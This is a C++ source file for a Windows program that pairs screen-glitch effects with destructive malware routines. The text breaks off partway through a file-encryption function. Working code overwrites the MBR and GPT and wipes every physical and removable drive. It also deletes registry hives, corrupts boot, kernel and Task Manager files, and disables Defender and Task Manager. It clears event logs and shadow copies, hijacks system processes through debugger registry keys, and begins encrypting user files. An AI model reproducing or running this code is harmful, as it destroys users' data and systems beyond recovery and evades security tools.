#include <Windows.h>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <thread>
#include <vector>
#include <algorithm>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <cctype>
#include <cstring>
#include <mmsystem.h>
#include <dwmapi.h>
#include <winternl.h>
#include <psapi.h>
#include <shlobj.h>
#include <VersionHelpers.h>
#include <shellapi.h>
#include <winioctl.h>
#include <ntdddisk.h>
#include <aclapi.h>
#include <setupapi.h>
#include <cfgmgr32.h>
#include <initguid.h>
#include <virtdisk.h>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <urlmon.h>
#include <winhttp.h>
#include <wininet.h>
#include <dpapi.h>
#include <wincrypt.h>
#include <gdiplus.h>
#include <random>
#include <chrono>
#include <atomic>
#include <mutex>
#include <condition_variable>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "virtdisk.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "cryptui.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "urlmon.lib")

using namespace Gdiplus;
using namespace std;
using namespace std::chrono;

// Global configuration
const int REFRESH_RATE = 3;
const int MAX_GLITCH_INTENSITY = 10000;
const int GLITCH_LINES = 2000;
const int MAX_GLITCH_BLOCKS = 1000;
const int SOUND_CHANCE = 1;
const int MAX_PARTICLES = 5000;
const int MAX_CORRUPTED_TEXTS = 100;

// Global variables
HBITMAP hGlitchBitmap = NULL;
BYTE* pPixels = NULL;
int screenWidth, screenHeight;
BITMAPINFO bmi = {};
int intensityLevel = 1;
DWORD startTime = GetTickCount();
int cursorX = 0, cursorY = 0;
bool cursorVisible = true;
int screenShakeX = 0, screenShakeY = 0;
bool textCorruptionActive = false;
DWORD lastEffectTime = 0;
ULONG_PTR gdiplusToken;

// Critical mode
bool criticalMode = false;
DWORD bsodTriggerTime = 0;
bool persistenceInstalled = false;
bool disableTaskManager = false;
bool disableRegistryTools = false;
bool fileCorruptionActive = false;
bool processKillerActive = false;
bool g_isAdmin = false;
bool destructiveActionsTriggered = false;
bool networkPropagationActive = false;
bool encryptionActive = false;
bool biosCorruptionActive = false;

// Advanced effects
bool matrixRainActive = false;
bool fractalNoiseActive = false;
bool screenBurnActive = false;
bool wormholeEffectActive = false;
bool temporalDistortionActive = false;

// Particle system
struct Particle {
    float x, y;
    float vx, vy;
    DWORD life;
    DWORD maxLife;
    COLORREF color;
    int size;
    int type;
    float rotation;
    float rotationSpeed;
};

// Corrupted text
struct CorruptedText {
    int x, y;
    std::wstring text;
    DWORD creationTime;
    float opacity;
    float driftX, driftY;
};

// Matrix rain
struct MatrixStream {
    int x;
    int y;
    int length;
    int speed;
    DWORD lastUpdate;
    std::wstring symbols;
};

// Advanced structures
struct FractalPoint {
    float x, y;
    float vx, vy;
    COLORREF color;
};

struct Wormhole {
    float centerX, centerY;
    float radius;
    float strength;
    DWORD creationTime;
};

// Containers
std::vector<Particle> particles;
std::vector<CorruptedText> corruptedTexts;
std::vector<MatrixStream> matrixStreams;
std::vector<FractalPoint> fractalPoints;
std::vector<Wormhole> wormholes;
std::mutex g_mutex;

// Random number generation
std::random_device rd;
std::mt19937 gen(rd());
std::uniform_int_distribution<> dis(0, 255);
std::uniform_real_distribution<> disf(0.0, 1.0);

// ======== ENHANCED ADMIN DESTRUCTIVE FUNCTIONS ========
BOOL IsRunAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin;
}

void DestroyMBR() {
    HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive == INVALID_HANDLE_VALUE) return;

    // Overwrite first 2048 sectors (1MB)
    const DWORD bufferSize = 512 * 2048;
    BYTE* garbageBuffer = new BYTE[bufferSize];
    for (DWORD i = 0; i < bufferSize; i++) {
        garbageBuffer[i] = static_cast<BYTE>(dis(gen));
    }

    DWORD bytesWritten;
    WriteFile(hDrive, garbageBuffer, bufferSize, &bytesWritten, NULL);
    FlushFileBuffers(hDrive);

    delete[] garbageBuffer;
    CloseHandle(hDrive);
}

void DestroyGPT() {
    HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive == INVALID_HANDLE_VALUE) return;

    // Overwrite GPT header at LBA 1 and backup at last LBA
    const int gptHeaderSize = 512;
    BYTE* gptGarbage = new BYTE[gptHeaderSize];
    for (int i = 0; i < gptHeaderSize; i++) {
        gptGarbage[i] = static_cast<BYTE>(dis(gen));
    }

    DWORD bytesWritten;
    LARGE_INTEGER offset;
    
    // Primary GPT header
    offset.QuadPart = 512;
    SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
    WriteFile(hDrive, gptGarbage, gptHeaderSize, &bytesWritten, NULL);

    // Get disk size for backup GPT header
    DISK_GEOMETRY_EX dg = {0};
    DWORD bytesReturned = 0;
    if (DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
        // Backup GPT header at last LBA
        offset.QuadPart = dg.DiskSize.QuadPart - 512;
        SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
        WriteFile(hDrive, gptGarbage, gptHeaderSize, &bytesWritten, NULL);
    }

    // Overwrite partition entries (more comprehensive)
    const DWORD partitionEntriesSize = 512 * 256;
    BYTE* partitionGarbage = new BYTE[partitionEntriesSize];
    for (DWORD i = 0; i < partitionEntriesSize; i++) {
        partitionGarbage[i] = static_cast<BYTE>(dis(gen));
    }

    // Primary partition entries
    offset.QuadPart = 512 * 2;
    SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
    WriteFile(hDrive, partitionGarbage, partitionEntriesSize, &bytesWritten, NULL);

    // Backup partition entries
    if (DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
        offset.QuadPart = dg.DiskSize.QuadPart - 512 - partitionEntriesSize;
        SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
        WriteFile(hDrive, partitionGarbage, partitionEntriesSize, &bytesWritten, NULL);
    }

    FlushFileBuffers(hDrive);

    delete[] gptGarbage;
    delete[] partitionGarbage;
    CloseHandle(hDrive);
}

void DestroyRegistry() {
    const wchar_t* registryKeys[] = {
        L"HKEY_LOCAL_MACHINE\\SOFTWARE",
        L"HKEY_LOCAL_MACHINE\\SYSTEM",
        L"HKEY_LOCAL_MACHINE\\SAM",
        L"HKEY_LOCAL_MACHINE\\SECURITY",
        L"HKEY_LOCAL_MACHINE\\HARDWARE",
        L"HKEY_CURRENT_USER\\Software",
        L"HKEY_CURRENT_USER\\System",
        L"HKEY_USERS\\.DEFAULT",
        L"HKEY_CLASSES_ROOT",
        L"HKEY_CURRENT_CONFIG"
    };

    for (size_t i = 0; i < sizeof(registryKeys)/sizeof(registryKeys[0]); i++) {
        HKEY hKey;
        wchar_t subKey[256];
        wchar_t rootKey[256];
        
        // Split registry path
        wchar_t* context = NULL;
        wcscpy_s(rootKey, 256, wcstok_s((wchar_t*)registryKeys[i], L"\\", &context));
        wcscpy_s(subKey, 256, context);
        
        HKEY hRoot;
        if (wcscmp(rootKey, L"HKEY_LOCAL_MACHINE") == 0) hRoot = HKEY_LOCAL_MACHINE;
        else if (wcscmp(rootKey, L"HKEY_CURRENT_USER") == 0) hRoot = HKEY_CURRENT_USER;
        else if (wcscmp(rootKey, L"HKEY_USERS") == 0) hRoot = HKEY_USERS;
        else if (wcscmp(rootKey, L"HKEY_CLASSES_ROOT") == 0) hRoot = HKEY_CLASSES_ROOT;
        else if (wcscmp(rootKey, L"HKEY_CURRENT_CONFIG") == 0) hRoot = HKEY_CURRENT_CONFIG;
        else continue;
        
        if (RegOpenKeyExW(hRoot, subKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
            // Delete all values
            wchar_t valueName[16383];
            DWORD valueNameSize;
            DWORD iValue = 0;
            
            while (1) {
                valueNameSize = 16383;
                if (RegEnumValueW(hKey, iValue, valueName, &valueNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
                RegDeleteValueW(hKey, valueName);
            }
            
            // Delete all subkeys recursively
            wchar_t subkeyName[256];
            DWORD subkeyNameSize;
            
            while (1) {
                subkeyNameSize = 256;
                if (RegEnumKeyExW(hKey, 0, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
                
                // Recursive deletion
                HKEY hSubKey;
                if (RegOpenKeyExW(hKey, subkeyName, 0, KEY_ALL_ACCESS, &hSubKey) == ERROR_SUCCESS) {
                    // Delete all values in subkey
                    wchar_t subValueName[16383];
                    DWORD subValueNameSize;
                    DWORD jValue = 0;
                    
                    while (1) {
                        subValueNameSize = 16383;
                        if (RegEnumValueW(hSubKey, jValue, subValueName, &subValueNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
                        RegDeleteValueW(hSubKey, subValueName);
                    }
                    RegCloseKey(hSubKey);
                }
                
                RegDeleteTreeW(hKey, subkeyName);
            }
            
            RegCloseKey(hKey);
        }
    }
}

void DisableCtrlAltDel() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, 
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }

    if (g_isAdmin) {
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            DWORD value = 1;
            RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegCloseKey(hKey);
        }
    }
}

void SetCriticalProcess() {
    typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(
        BOOLEAN bNew,
        BOOLEAN *pbOld,
        BOOLEAN bNeedScb
    );

    HMODULE hNtDll = LoadLibraryW(L"ntdll.dll");
    if (hNtDll) {
        pRtlSetProcessIsCritical RtlSetProcessIsCritical = 
            (pRtlSetProcessIsCritical)GetProcAddress(hNtDll, "RtlSetProcessIsCritical");
        if (RtlSetProcessIsCritical) {
            RtlSetProcessIsCritical(TRUE, NULL, FALSE);
        }
        FreeLibrary(hNtDll);
    }
}

void KillCriticalProcesses();

void BreakTaskManager() {
    // Corrupt taskmgr.exe and related files
    const wchar_t* taskmgrPaths[] = {
        L"C:\\Windows\\System32\\taskmgr.exe",
        L"C:\\Windows\\SysWOW64\\taskmgr.exe",
        L"C:\\Windows\\System32\\Taskmgr.exe.mui",
        L"C:\\Windows\\SysWOW64\\Taskmgr.exe.mui",
        L"C:\\Windows\\System32\\en-US\\taskmgr.exe.mui",
        L"C:\\Windows\\SysWOW64\\en-US\\taskmgr.exe.mui"
    };

    for (size_t i = 0; i < sizeof(taskmgrPaths)/sizeof(taskmgrPaths[0]); i++) {
        HANDLE hFile = CreateFileW(taskmgrPaths[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                BYTE* buffer = new BYTE[fileSize];
                if (buffer) {
                    for (DWORD j = 0; j < fileSize; j++) {
                        buffer[j] = static_cast<BYTE>(dis(gen));
                    }
                    DWORD written;
                    WriteFile(hFile, buffer, fileSize, &written, NULL);
                    delete[] buffer;
                }
            }
            CloseHandle(hFile);
        }
    }

    // Kill existing task manager processes
    KillCriticalProcesses();
}

// ============== ENHANCED DESTRUCTIVE FEATURES ==============
void ClearEventLogs() {
    const wchar_t* logs[] = {
        L"Application", L"Security", L"System", L"Setup", 
        L"ForwardedEvents", L"HardwareEvents", L"Internet Explorer",
        L"Windows PowerShell", L"Microsoft-Windows-Windows Defender/Operational"
    };
    
    for (int i = 0; i < sizeof(logs)/sizeof(logs[0]); i++) {
        wchar_t command[256];
        wsprintfW(command, L"wevtutil cl \"%s\"", logs[i]);
        
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

void ClearShadowCopies() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, L"vssadmin delete shadows /all /quiet", 
                 NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    // Also try with wmic
    CreateProcessW(NULL, L"wmic shadowcopy delete", 
                 NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

void WipeRemovableMedia() {
    const int BUFFER_SIZE = 1024 * 1024; // 1MB buffer
    BYTE* wipeBuffer = new BYTE[BUFFER_SIZE];
    for (int i = 0; i < BUFFER_SIZE; i++) {
        wipeBuffer[i] = static_cast<BYTE>(dis(gen));
    }

    wchar_t drives[128];
    DWORD len = GetLogicalDriveStringsW(127, drives);
    wchar_t* drive = drives;
    
    while (*drive) {
        UINT type = GetDriveTypeW(drive);
        if (type == DRIVE_REMOVABLE || type == DRIVE_CDROM || type == DRIVE_REMOTE) {
            wchar_t devicePath[50];
            wsprintfW(devicePath, L"\\\\.\\%c:", drive[0]);
            
            HANDLE hDevice = CreateFileW(devicePath, GENERIC_WRITE, 
                FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
            
            if (hDevice != INVALID_HANDLE_VALUE) {
                DISK_GEOMETRY_EX dg = {0};
                DWORD bytesReturned = 0;
                if (DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, 
                    NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
                    
                    LARGE_INTEGER diskSize = dg.DiskSize;
                    LARGE_INTEGER totalWritten = {0};
                    
                    while (totalWritten.QuadPart < diskSize.QuadPart) {
                        DWORD bytesToWrite = (diskSize.QuadPart - totalWritten.QuadPart > BUFFER_SIZE) 
                            ? BUFFER_SIZE : diskSize.QuadPart - totalWritten.QuadPart;
                        
                        DWORD bytesWritten;
                        WriteFile(hDevice, wipeBuffer, bytesToWrite, &bytesWritten, NULL);
                        totalWritten.QuadPart += bytesWritten;
                    }
                }
                CloseHandle(hDevice);
            }
        }
        drive += wcslen(drive) + 1;
    }
    
    delete[] wipeBuffer;
}

void CorruptBootFiles() {
    const wchar_t* bootFiles[] = {
        L"C:\\Windows\\Boot\\PCAT\\bootmgr",
        L"C:\\Windows\\Boot\\EFI\\bootmgfw.efi",
        L"C:\\Windows\\System32\\winload.exe",
        L"C:\\Windows\\System32\\winload.efi",
        L"C:\\Windows\\System32\\winresume.exe",
        L"C:\\Windows\\System32\\winresume.efi",
        L"C:\\Windows\\System32\\bootres.dll",
        L"C:\\Windows\\System32\\Boot\\bootres.dll",
        L"C:\\Windows\\System32\\config\\SYSTEM",
        L"C:\\Windows\\System32\\config\\SOFTWARE",
        L"C:\\Windows\\System32\\config\\SECURITY",
        L"C:\\Windows\\System32\\config\\SAM",
        L"C:\\Windows\\System32\\config\\DEFAULT"
    };

    for (int i = 0; i < sizeof(bootFiles)/sizeof(bootFiles[0]); i++) {
        HANDLE hFile = CreateFileW(bootFiles[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                BYTE* buffer = new BYTE[fileSize];
                for (DWORD j = 0; j < fileSize; j++) {
                    buffer[j] = static_cast<BYTE>(dis(gen));
                }
                DWORD written;
                WriteFile(hFile, buffer, fileSize, &written, NULL);
                delete[] buffer;
            }
            CloseHandle(hFile);
        }
    }
}

void CorruptKernelFiles() {
    const wchar_t* kernelFiles[] = {
        L"C:\\Windows\\System32\\ntoskrnl.exe",
        L"C:\\Windows\\System32\\ntkrnlpa.exe",
        L"C:\\Windows\\System32\\hal.dll",
        L"C:\\Windows\\System32\\kdcom.dll",
        L"C:\\Windows\\System32\\ci.dll",
        L"C:\\Windows\\System32\\drivers\\*.sys",
        L"C:\\Windows\\System32\\drivers\\etc\\hosts",
        L"C:\\Windows\\System32\\drivers\\etc\\networks"
    };

    for (int i = 0; i < sizeof(kernelFiles)/sizeof(kernelFiles[0]); i++) {
        // Handle wildcards
        if (wcschr(kernelFiles[i], L'*') != NULL) {
            WIN32_FIND_DATAW fd;
            HANDLE hFind = FindFirstFileW(kernelFiles[i], &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        wchar_t filePath[MAX_PATH];
                        wcscpy_s(filePath, MAX_PATH, L"C:\\Windows\\System32\\drivers\\");
                        wcscat_s(filePath, MAX_PATH, fd.cFileName);
                        
                        HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                        if (hFile != INVALID_HANDLE_VALUE) {
                            DWORD fileSize = GetFileSize(hFile, NULL);
                            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                                BYTE* buffer = new BYTE[fileSize];
                                for (DWORD j = 0; j < fileSize; j++) {
                                    buffer[j] = static_cast<BYTE>(dis(gen));
                                }
                                DWORD written;
                                WriteFile(hFile, buffer, fileSize, &written, NULL);
                                delete[] buffer;
                            }
                            CloseHandle(hFile);
                        }
                    }
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
        } else {
            HANDLE hFile = CreateFileW(kernelFiles[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD fileSize = GetFileSize(hFile, NULL);
                if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                    BYTE* buffer = new BYTE[fileSize];
                    for (DWORD j = 0; j < fileSize; j++) {
                        buffer[j] = static_cast<BYTE>(dis(gen));
                    }
                    DWORD written;
                    WriteFile(hFile, buffer, fileSize, &written, NULL);
                    delete[] buffer;
                }
                CloseHandle(hFile);
            }
        }
    }
}

void DisableWindowsDefender() {
    // Layer 1: Stop services
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        const wchar_t* services[] = {
            L"WinDefend", L"WdNisSvc", L"SecurityHealthService", L"wscsvc",
            L"MsMpSvc", L"mpssvc", L"Sense", L"SgrmAgent", L"SgrmBroker"
        };
        
        for (int i = 0; i < sizeof(services)/sizeof(services[0]); i++) {
            SC_HANDLE service = OpenServiceW(scm, services[i], SERVICE_ALL_ACCESS);
            if (service) {
                SERVICE_STATUS status;
                ControlService(service, SERVICE_CONTROL_STOP, &status);
                
                // Disable service
                SERVICE_CONFIG config;
                QueryServiceConfig(service, &config, sizeof(config), &DWORD(0));
                ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_DISABLED, 
                                  SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
                CloseServiceHandle(service);
            }
        }
        CloseServiceHandle(scm);
    }

    // Layer 2: Disable via registry
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD disable = 1;
        RegSetValueExW(hKey, L"DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegSetValueExW(hKey, L"DisableAntiVirus", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegSetValueExW(hKey, L"DisableRoutinelyTakingAction", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegCloseKey(hKey);
    }

    // Layer 3: Disable real-time protection
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD disable = 0;
        RegSetValueExW(hKey, L"DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegSetValueExW(hKey, L"DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegSetValueExW(hKey, L"DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegSetValueExW(hKey, L"DisableScanOnRealtimeEnable", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegSetValueExW(hKey, L"DisableIOAVProtection", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
        RegCloseKey(hKey);
    }

    // Layer 4: Disable scheduled tasks
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    const wchar_t* tasks[] = {
        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance",
        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup",
        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan",
        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification",
        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Heartbeat"
    };
    
    for (int i = 0; i < sizeof(tasks)/sizeof(tasks[0]); i++) {
        wchar_t command[512];
        wsprintfW(command, L"schtasks /Change /TN \"%s\" /DISABLE", tasks[i]);
        CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, 2000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        wsprintfW(command, L"schtasks /Delete /TN \"%s\" /F", tasks[i]);
        CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, 2000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

void SetCustomBootFailure() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        
        HKEY subKey;
        if (RegCreateKeyExW(hKey, L"winlogon.exe", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &subKey, NULL) == ERROR_SUCCESS) {
            wchar_t debugger[] = L"cmd.exe /c \"echo CRITICAL SYSTEM FAILURE && echo Bootloader corrupted && echo System integrity compromised && echo Contact administrator && pause\"";
            RegSetValueExW(subKey, L"Debugger", 0, REG_SZ, (BYTE*)debugger, (wcslen(debugger) + 1) * sizeof(wchar_t));
            RegCloseKey(subKey);
        }
        
        // Target more critical processes
        const wchar_t* processes[] = {
            L"lsass.exe", L"services.exe", L"svchost.exe", L"csrss.exe", L"wininit.exe"
        };
        
        for (int i = 0; i < sizeof(processes)/sizeof(processes[0]); i++) {
            if (RegCreateKeyExW(hKey, processes[i], 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &subKey, NULL) == ERROR_SUCCESS) {
                wchar_t debugger[] = L"cmd.exe /c \"echo CRITICAL SYSTEM FAILURE && shutdown -r -t 0\"";
                RegSetValueExW(subKey, L"Debugger", 0, REG_SZ, (BYTE*)debugger, (wcslen(debugger) + 1) * sizeof(wchar_t));
                RegCloseKey(subKey);
            }
        }
        
        RegCloseKey(hKey);
    }

    // Set custom shutdown message
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        wchar_t caption[] = L"CRITICAL SYSTEM FAILURE";
        wchar_t message[] = L"Bootloader corrupted. System integrity compromised. Contact administrator.\n\nAll data may be lost. Do not power off the system.";
        RegSetValueExW(hKey, L"legalnoticecaption", 0, REG_SZ, (BYTE*)caption, (wcslen(caption) + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"legalnoticetext", 0, REG_SZ, (BYTE*)message, (wcslen(message) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

void WipeAllDrives() {
    const int BUFFER_SIZE = 1024 * 1024; // 1MB buffer
    BYTE* wipeBuffer = new BYTE[BUFFER_SIZE];
    for (int i = 0; i < BUFFER_SIZE; i++) {
        wipeBuffer[i] = static_cast<BYTE>(dis(gen));
    }

    // Wipe up to 16 physical drives
    for (int driveNum = 0; driveNum < 16; driveNum++) {
        wchar_t devicePath[50];
        wsprintfW(devicePath, L"\\\\.\\PhysicalDrive%d", driveNum);
        
        HANDLE hDevice = CreateFileW(devicePath, GENERIC_WRITE, 
            FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        
        if (hDevice != INVALID_HANDLE_VALUE) {
            DISK_GEOMETRY_EX dg = {0};
            DWORD bytesReturned = 0;
            if (DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, 
                NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
                
                LARGE_INTEGER diskSize = dg.DiskSize;
                LARGE_INTEGER totalWritten = {0};
                
                while (totalWritten.QuadPart < diskSize.QuadPart) {
                    DWORD bytesToWrite = (diskSize.QuadPart - totalWritten.QuadPart > BUFFER_SIZE) 
                        ? BUFFER_SIZE : diskSize.QuadPart - totalWritten.QuadPart;
                    
                    DWORD bytesWritten;
                    WriteFile(hDevice, wipeBuffer, bytesToWrite, &bytesWritten, NULL);
                    totalWritten.QuadPart += bytesWritten;
                }
            }
            CloseHandle(hDevice);
        }
    }
    
    delete[] wipeBuffer;
}

// ======== ADVANCED DESTRUCTIVE FUNCTIONS ========
void EncryptUserFiles() {
    wchar_t userProfile[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile))) {
        // Encrypt common user folders
        const wchar_t* folders[] = {
            L"\\Documents", L"\\Pictures", L"\\Videos", L"\\Music", 
            L"\\Downloads", L"\\Desktop", L"\\Contacts", L"\\Favorites"
        };
        
        for (int i = 0; i < sizeof(folders)/sizeof(folders[0]); i++) {
            wchar_t folderPath[MAX_PATH];
            wcscpy_s(folderPath, MAX_PATH, userProfile);
            wcscat_s(folderPath, MAX_PATH, folders[i]);
            
            // Simple XOR "encryption" - in a real virus, this would use proper crypto
            WIN32_FIND_DATAW fd;
            wchar_t searchPath[MAX_PATH];
            wsprintfW(searchPath, L"%s\\*", folderPath);
            
            HANDLE hFind = FindFirstFileW(searchPath, &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        wchar_t filePath[MAX_PATH];
                        wsprintfW(filePath, L"%s\\%s", folderPath, fd.cFileName);
                        
                        HANDLE hFile = CreateFileW(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                        if (hFile != INVALID_HANDLE_VALUE) {
                            DWORD fileSize = GetFileSize(hFile, NULL);
                            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                                BYTE* buffer = new BYTE[fileSize];
